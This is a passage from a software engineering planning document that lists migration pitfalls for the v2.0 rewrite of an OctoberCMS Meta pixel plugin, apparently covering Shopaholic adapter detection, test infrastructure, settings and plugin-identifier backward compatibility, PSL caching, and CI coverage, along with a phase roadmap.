- ❌ `PluginManager::instance()->hasPlugin('Lovata.OrdersShopaholic')` — checks October plugin registry. Returns true only AFTER Lovata plugin is FOUND (manifest scanned). Timing-safe if called from `boot()`, but UNSAFE if called from `register()` (which runs earlier than `boot()`).
- ❌ `class_exists()` after suggesting → false positive if a DIFFERENT plugin / dev tool autoloads the same class name (Mockery aliases, package conflicts).
- ❌ `composer suggest` doesn't enforce version — operator can install `lovata/ordersshopaholic ^0.5` (broken) and adapter binds anyway → runtime errors deep in Purchase flow.

**Warning signs:**
- Fresh install without Shopaholic boots OK but logs "ShopaholicAdapter registered: yes" (false positive).
- Operator installs old Shopaholic version; ShopaholicAdapter loads; first Purchase POST throws `Method not found` (signature mismatch with old Lovata).
- Tests pass locally; CI Run B (minimal install) reports adapter registered when it shouldn't be.

**Prevention strategy:**
1. **Detection chain (strict):**
   ```php
   public static function detect(): bool
   {
       if (! class_exists(\Lovata\OrdersShopaholic\Models\Order::class)) return false;
       if (! \System\Classes\PluginManager::instance()->hasPlugin('Lovata.OrdersShopaholic')) return false;
       // Version gate — read Lovata's plugin.yaml or composer.lock
       $sVersion = \Lovata\OrdersShopaholic\Plugin::VERSION ?? null;
       if ($sVersion === null) return false;
       return version_compare($sVersion, '1.33.0', '>=');
   }
   ```
2. **`AdapterRegistry::registerIfAvailable($sClass)`** — calls `$sClass::detect()`; logs decision to system log at INFO level so operator can audit.
3. **Operator-supplied Settings escape hatch:** `force_disable_shopaholic_adapter` toggle. Even if detection is true, operator can opt out.
4. **CI Run B asserts**: ShopaholicAdapter NOT registered when Lovata not installed. ShopaholicAdapter registered when installed.
5. **Composer suggest minimum:** README explicitly states `lovata/ordersshopaholic-plugin ^1.33` is the supported version. Adapter aborts on older.

**Phase mapping:**
- **Phase 1 (composer.json):** suggest entries.
- **Phase 3 (ShopaholicAdapter):** detect() method + version gate + integration test (Run A + Run B).

---

### P-12 — `MetapixelTestCase` boots Shopaholic Orders table — generic core tests fail on minimal install

**v1.x anchor:** PROJECT.md pivot rationale lists `MetapixelTestCase::bootOrdersTable` as one of seven Shopaholic-coupling points. CR-04 + WR-04 in Phase 2 REVIEW also flag the test-harness brittleness around Shopaholic + Settings cache.

**What goes wrong in v2.0:** Carrying v1.x test base verbatim:
1. `MetapixelTestCase::setUp()` calls Shopaholic migrations → minimal install (no `lovata/ordersshopaholic` in composer.lock) fails: migration class not found.
2. Generic-core tests SHOULD NOT depend on Shopaholic Orders table existing. If they do, the generic core is still Shopaholic-coupled in tests, even if production code is decoupled — false confidence.
3. CI Run B (no Lovata) fails immediately at test bootstrap.

**Warning signs:**
- `composer test` in CI Run B fails with "table not found: lovata_orders_shopaholic_orders" before any test method runs.
- Generic-core test method uses `OrderFixtures::create(...)` → Shopaholic-specific fixture leaks into test logic.
- Adapter-specific test (`ShopaholicAdapterTest`) extends `MetapixelTestCase` but should extend `ShopaholicAdapterTestCase` to scope migrations.

**Prevention strategy:**
1. **Three-tier test base:**
   - `MetapixelTestCase` (generic core): boots OctoberCMS + `logingrupa_metapixel_*` tables ONLY. No third-party plugins.
   - `ShopaholicAdapterTestCase extends MetapixelTestCase`: adds Shopaholic migrations + Order fixtures. Lives in `adapters/Shopaholic/tests/`.
   - `ThemeActionAdapterTestCase extends MetapixelTestCase`: adds Theme action fixtures.
2. **Migration discovery:** `MetapixelTestCase::registerMigrations()` only scans `plugins/logingrupa/metapixel/updates/`. Adapter test case scans its own migrations.
3. **Pest config:** `uses(ShopaholicAdapterTestCase::class)->in('adapters/Shopaholic/tests/')`; `uses(MetapixelTestCase::class)->in('tests/')`.
4. **CI Run B doesn't run adapter tests:** GitHub Actions matrix `--testsuite=generic` vs `--testsuite=adapters`. Run B = generic only.

**Phase mapping:**
- **Phase 1 (test infra):** three-tier test base. Pest config. Migrate v1.x tests to appropriate tier.

---

## MEDIUM

### P-13 — `addDynamicMethod()` + `Component::extend()` unbounded extensibility

**v1.x anchor:** CartComponentHandler in `plugins/logingrupa/storeextender/classes/event/cart/` uses this pattern (referenced in CLAUDE.md). PROJECT.md spec includes "service-container bindings for HTTP client swap" + "addDynamicMethod() patterns for third-party hookpoints".

**What goes wrong in v2.0:** If `Logingrupa\Metapixel\Components\PixelHead` is extended by 3 third-party plugins each calling `Component::extend(PixelHead::class, function($c) { $c->addDynamicMethod('onCustom', ...) })`, naming collisions occur. Last-registered wins, others silently overwritten.

**Warning signs:** Third-party authors report "my onCustom doesn't fire". Multiple plugins installed → only one's handler fires.

**Prevention strategy:**
1. **Convention:** dynamic methods MUST be prefixed by plugin owner: `onMetapixelShopaholicCustom`. Document in AuthoringGuide.
2. **`Component::extend` test:** authoring guide ships sample test asserting `methodExists()` returns true after extension.
3. **Don't expose `Component::extend` as the primary hookpoint:** prefer `Event::fire(...)` + listener pattern (queryable, priority-aware). Reserve `addDynamicMethod` for advanced cases.

**Phase mapping:** Phase 2 (extensibility contract) — document convention, prefer Event::fire over addDynamicMethod.

---

### P-14 — Settings keys renamed without BC migration

**v1.x anchor:** Settings fields `paid_status_code`, `refire_purchase_on_status_flip` are Shopaholic-specific. v2.0 generic shape can't reuse them — they move to ShopaholicAdapter's per-adapter settings.

**What goes wrong:** Operator upgrade reads `Settings::get('paid_status_code')` → returns null because generic Settings no longer has the field → ShopaholicAdapter falls back to default `'5'` (status ID 5 = `new-payment-received`). Works for v1.x deployment by coincidence. Breaks if operator had a non-default value.

**Warning signs:** Operator says "I configured paid_status_code = 3 because my install uses status ID 3 for paid, but after v2.0 upgrade Purchase fires on status 5 instead." Real-world incident risk.

**Prevention strategy:**
1. **Per-adapter Settings model:** `ShopaholicAdapter\Models\Settings` extends `Lovata\Toolbox\Models\CommonSettings`, fields `paid_status_code`, `refire_purchase_on_status_flip`.
2. **Migration:** copy v1.x values from `logingrupa_metapixelshopaholic_settings` into the new adapter Settings row on upgrade. Idempotent.
3. **Smoke test:** seed v1.x Settings row with paid_status_code='3', run migration, assert ShopaholicAdapter Settings reads '3'.

**Phase mapping:** Phase 3 (ShopaholicAdapter) + Phase 9 (BC migration).

---

### P-15 — `HOST_INDEX_MAP` hardcoded for nailscosmetics.* — marketplace install gets wrong index

**v1.x anchor:** Phase 2 CR-02 fix shipped hardcoded HOST_INDEX_MAP. v2.0 spec generalizes via Settings allowlist + php-domain-parser. But during transition (Phase 4 not yet done), v1.x code carries forward.

**What goes wrong:** Marketplace operator installs v2.0 on `shop.example.de` → host not in HOST_INDEX_MAP → middleware returns without setting `_fbp` (per CR-02 fix). Plugin works (graceful), but EMQ degrades. Operator doesn't know why.

**Warning signs:** Operator's Meta Test Events tab shows missing `_fbp` value. EMQ < 8 despite operator providing all PII.

**Prevention strategy:**
1. **Phase 4 must ship before public marketplace launch.** Otherwise default behavior (refuse to set cookies on unknown hosts) is silently wrong for the marketplace audience.
2. **Settings allowlist UI:** operator enters their domains + subdomain-index pairs. Default: empty allowlist → middleware uses PDP-derived fallback (more permissive). Trade-off: marketplace usability vs security.
3. **README install guide:** "Step 5: in backend → Metapixel Settings, add your domain to the TrustedHosts allowlist." Required step for first-event-to-fire <10min onboarding.

**Phase mapping:** Phase 4 (Settings + TrustedHosts). MUST land before marketplace launch (Phase 10).

---

### P-16 — Plugin manifest identifier change → October treats as NEW plugin

**v1.x anchor:** `system_plugin_versions` row keyed by `Logingrupa.Metapixelshopaholic`. v2.0 identifier `Logingrupa.Metapixel`.

**What goes wrong:** Operator's pre-v2.0 install has `system_plugin_versions.code='Logingrupa.Metapixelshopaholic'` with `last_version='1.1.1'`. v2.0 deploys with new identifier — October reads `system_plugin_versions` for `Logingrupa.Metapixel`, finds no row, RUNS ALL MIGRATIONS FROM 0.0.0. The migrations are idempotent (CREATE TABLE IF NOT EXISTS, etc.) — but the ledger now has TWO rows: one stale (`Metapixelshopaholic` v1.1.1), one new (`Metapixel` v2.0.0). Backend "Updates" page shows weird state. Worse: if v2.0 migrations use `$this->table('logingrupa_metapixel_event_log')->dropIfExists()` to rebuild schema, operator's data is destroyed.

**Warning signs:** Backend Settings shows two plugins enabled with similar names. `system_plugin_versions` has dual rows. `php artisan october:up` re-runs migrations unexpectedly.

**Prevention strategy:**
1. **Migration step:** Phase 9 BC migration UPDATEs `system_plugin_versions.code` from `Logingrupa.Metapixelshopaholic` to `Logingrupa.Metapixel` ONCE — preserves last_version='1.1.1' so October treats v2.0 as an upgrade not a fresh install.
2. **Plugin manifest:** if October 4.x supports `replaces:` in plugin metadata, declare `replaces: 'Logingrupa.Metapixelshopaholic'`. Verify from October source.
3. **Migration idempotency audit:** every v2.0 migration's `up()` is `IF NOT EXISTS`/idempotent. No destructive ops on existing tables.
4. **Smoke test:** seed `system_plugin_versions` row with v1.x identifier, run v2.0 migrations, assert single row remains keyed by v2.0 identifier.

**Phase mapping:** Phase 9 (BC migration). Block release until this is verified on a copy of nailscosmetics.lv DB.

---

### P-17 — BC shim package creates dual-load

**v1.x anchor:** Some operators may install both old + new plugin during transition (forgot to remove old dir). v1.x `Plugin::boot()` registers OrderStatusWatcher; v2.0 `Plugin::boot()` registers ShopaholicAdapter which also subscribes to Order events.

**What goes wrong:** Order status changes fire BOTH watchers — Purchase dispatch runs twice. Second run hits UNIQUE constraint and EventLogWriter returns false → no HTTP POST (safe!) but two extra DB hits, two extra log lines, two failed-event candidates if writer's bug class returns false on actual error (P-01 anchor: EventLogWriter::record returns false on UNIQUE collision OR DB failure — fail-safe semantics. If we're not careful, "false" hides real DB failures from the operator).

**Warning signs:** Operator log shows duplicate "Purchase dispatch attempted" lines. `event_log` table has zero new rows but operator's DB monitor shows INSERT activity.

**Prevention strategy:**
1. **DON'T ship a BC shim package.** Document operator-manual step: "(1) deploy v2.0, (2) remove `plugins/logingrupa/metapixelshopaholic/` from disk, (3) clear cache." If operator doesn't do step 2, they get warning logs but not silent corruption (UNIQUE constraint protects).
2. **Plugin::boot()** in v2.0 logs WARN if `class_exists('Logingrupa\Metapixelshopaholic\Plugin')` is true — surfaces the dual-install state explicitly.
3. **EventLogWriter::record() honest-failure separation:** distinguish UNIQUE collision (return false, no log) from DB exception (return false AND log error AND increment failed-event counter). Phase 3.1-08 T3 may have implemented this — audit + carry forward.

**Phase mapping:** Phase 9 (BC) — manual operator step + dual-install warning + writer return-shape audit.

---

### P-18 — PDP cache write fails silently on Forge read-only release dirs

**v1.x anchor:** Forge zero-downtime releases: `releases/{timestamp}/` becomes read-only after deploy; `storage/` is shared symlink. v1.x didn't use PDP.

**What goes wrong:** `php-domain-parser` default cache path is the package's own directory. On Forge release dir = read-only → cache write throws → exception propagates to middleware → 500. Or library silently falls back to in-memory only → every request re-fetches PSL from publicsuffix.org → first-request latency + risk of rate-limit (publicsuffix.org has been DDoSed).

**Warning signs:** First request after deploy 500s. `storage/logs/laravel.log` has "Permission denied" for PSL cache write. PSL refresh fails on Forge deploy.

**Prevention strategy:**
1. **Cache path = `storage/app/metapixel/psl/`** (writable, shared across releases via Forge `storage` symlink). Configurable via Settings.
2. **Ship a checked-in PSL `.dat` file in `resources/`** with last-known-good copy. Loaded as primary; runtime refresh into `storage/app/metapixel/psl/` is a background opportunistic update.
3. **Artisan command** `metapixel:refresh-psl` for operator/cron to refresh manually. Document in README.
4. **Test:** Mock filesystem with read-only mode; assert PDP wrapper falls back to checked-in copy, no exception bubbles.

**Phase mapping:** Phase 4 (Settings + TrustedHosts + PDP integration).

---

## LOW

### P-19 — Pest `uses(...)->in('Feature')` carries Shopaholic-coupled base to all adapter tests

**v1.x anchor:** `tests/Pest.php` likely has `uses(MetapixelTestCase::class)->in('Feature', 'Unit')` to wire base. If v2.0 keeps that line and adds adapter tests under `tests/Adapters/Shopaholic/`, the bootstrap stays unified — adapter test bases must override carefully.

**Prevention strategy:** Pest `uses()` scoping by sub-dir (`uses(ShopaholicAdapterTestCase::class)->in('Feature/Adapters/Shopaholic')`). See P-12 prevention.

**Phase mapping:** Phase 1 (test infra). Covered by P-12.

---

### P-20 — Coverage threshold computed against partial code paths

**v1.x anchor:** v1.1.1 coverage 82.8%. Phase 3.1-08 baseline set 90% as v2.0 target. But if Run B (minimal install) skips adapter code, the coverage report on Run B will be HIGH (adapter code not loaded → 100% of loaded code). Run A includes adapter code so coverage may be lower.

**Warning signs:** CI reports 95% coverage on Run B; 78% on Run A. Operator merges PR assuming "green" but adapter code regressed.

**Prevention strategy:**
1. **Coverage is computed on Run A only** (full install — exercises all code paths).
2. **Run B is a smoke-test job, not a coverage job.** Its purpose is "does it boot without Lovata".
3. **Coverage threshold 90% applies to Run A.** Document in CI YAML.

**Phase mapping:** Phase 1 (CI matrix).

---

## Phase-Specific Pitfall Map (for Roadmap)

| Phase (working name) | Pitfalls owned (must address before phase close) |
|----------------------|---------------------------------------------------|
| **Phase 1 — Tooling + composer.json + namespace rename** | P-03 (composer-dependency-analyser + CI Run B), P-04 (namespace + dir + lang fixtures), P-06 (PHP 8.3+8.4 matrix), P-12 (three-tier test base), P-19 (Pest scoping), P-20 (coverage on Run A only) |
| **Phase 2 — Adapter contract + AdapterRegistry + Event hooks** | P-01 (adapter contract + getSiteId + test), P-02 (boot-order test + lazy resolve + flush test), P-05 (subject_type alias convention), P-08 (Event::fire hook contract + isolation), P-13 (Component::extend convention) |
| **Phase 3 — ShopaholicAdapter port from v1.x** | P-03 (Lovata imports scoped to adapter dir), P-05 (ShopaholicAdapter returns `'shopaholic.order'` alias), P-11 (detect() + version gate + Run B asserts non-registration), P-14 (per-adapter Settings) |
| **Phase 4 — Settings rewrite (TrustedHosts + Multisite + PDP)** | P-07 (PDP wrap + PSL cache + fallback chain), P-10 (Multisite trait `$propagatable=[]` + cross-context test), P-15 (Settings allowlist UI ships before launch), P-18 (PSL cache path = storage/) |
| **Phase 5 — ThemeActionAdapter** | P-09 (event_name allowlist + CSRF + rate limit + JS-escape audit) |
| **Phase 9 — Backward compat for nailscosmetics.* upgrade** | P-04 (system_settings migration + lang fallback), P-14 (paid_status_code per-adapter migration), P-16 (system_plugin_versions identifier rewrite), P-17 (manual operator step + dual-install warning) |
| **Phase 10 — Marketplace launch** | All phases must be closed. P-15 specifically blocks launch. |

---

## Cross-Cutting Prevention Practices (every phase)

1. **PR template checklist:**
   - [ ] No `Lovata\*` imports outside `classes/adapter/ShopaholicAdapter/`.
   - [ ] No `SiteManager::instance()` outside `classes/helper/SiteResolver.php`.
   - [ ] No PHP 8.4-only syntax (Rector report clean).
   - [ ] No `Settings::get(...)` in queue/event handler context without `?int $iSiteId` resolution from subject.
   - [ ] New hook? Document payload mutability + exception handling in PHPDoc.
   - [ ] New Settings field? BC migration entry for nailscosmetics.* upgrade?
   - [ ] CI Run A green AND Run B green (minimal install)?

2. **Static analysis tooling (added to Phase 1):**
   - PHPStan `phpVersion: 80300` (lowest supported)
   - `phpstan-disallowed-calls`: ban `SiteManager::*`, ban `Lovata\*` outside adapter dir, ban PHP 8.4 syntax
   - `shipmonk/composer-dependency-analyser`: enforce Lovata only in adapter dir
   - `Rector` with Php83 ON, Php84 OFF
   - Pint with `nullable_type_declaration_for_default_null_value` ON

3. **Test patterns:**
   - Every test that uses `Config::set('system.active_site', ...)` SHOULD also flip a per-subject attribute and assert resolution comes from the SUBJECT — not the context.
   - Every adapter ships a contract test inheriting a base test trait: "given subject fixture, getSiteId returns deterministic value regardless of active site".
   - Every hook fired by core ships a test: "given a throwing listener, core dispatch succeeds, listener error logged".

4. **Convention docs (CLAUDE.md addendums in Phase 1):**
   - Authoritative source for per-event attributes = subject's adapter, never request context.
   - `subject_type` is an opaque alias string, not a class FQN.
   - Settings reads in queue context MUST happen at the multi-site row identified by subject's site_id.
   - PHP 8.3 is the lowest supported version — no 8.4-only syntax.

---

## Sources

- v1.x archive: `.planning/milestones/v1.1.1-ROADMAP.md` (Phase 3.1-07 production bug record)
- v1.x review: `.planning/archive/v1.1.1/phases/02-skeleton-cookie-fix/02-REVIEW.md` (CR-02, CR-03, CR-04, CR-05, WR-02 anchors)
- v1.x cleanup: `.planning/archive/v1.1.1/phases/03.1-08-dead-code-cleanup/BRIEF.md` (test infra coupling, T3.2 lang namespace bug, T3.4 Settings cache bug)
- [php-domain-parser UPGRADING.md](https://github.com/jeremykendall/php-domain-parser/blob/develop/UPGRADING.md) — IDNA2008 stricter, return type changes, cache requirements (HIGH confidence — official upstream)
- [PHP 8.4 deprecations](https://www.php.net/manual/en/migration84.deprecated.php) — implicit nullable, dynamic properties, property hooks (HIGH confidence — official)
- [OctoberCMS Multisite trait docs](https://docs.octobercms.com/4.x/cms/resources/multisite.html) — `$propagatable` semantics, `savePropagate()` (HIGH confidence — official)
- [Composer suggest semantics](https://getcomposer.org/doc/04-schema.md#suggest) — no version enforcement (HIGH confidence — official)

Confidence on prevention strategies overall: **MEDIUM-HIGH** — most pitfalls are direct extrapolations from documented v1.x mistakes; the prevention patterns (CI matrix, PHPStan disallowed-calls, three-tier test base, BC migration smoke tests) are standard practice with concrete v1.x anchors. Lower confidence on P-13 (Component::extend convention — depends on third-party adoption discipline, only enforceable by docs) and P-17 (dual-install warning — depends on operator following manual upgrade steps).
